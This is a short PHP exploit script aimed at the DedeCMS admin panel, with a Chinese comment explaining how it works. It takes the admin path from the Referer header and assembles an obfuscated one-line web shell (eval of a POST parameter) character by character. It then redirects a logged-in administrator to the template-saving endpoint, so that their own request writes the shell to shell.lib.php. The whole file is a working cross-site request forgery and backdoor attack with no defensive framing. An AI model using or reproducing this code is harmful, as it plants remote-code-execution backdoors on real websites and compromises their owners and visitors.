<?php
$referer = $_SERVER['HTTP_REFERER'];
$dede_login = str_replace("friendlink_main.php","",$referer);//去掉friendlink_main.php，取得dede后台的路径
$muma = '<'.'?'.'@'.'e'.'v'.'a'.'l'.'('.'$'.'_'.'P'.'O'.'S'.'T'.'['.'\''.'c'.'\''.']'.')'.';'.'?'.'>';
$exp = 'tpl.php?action=savetagfile&actiondo=addnewtag&content='. $muma .'&filename=shell.lib.php';
$url = $dede_login.$exp;
header("location: ".$url);
exit();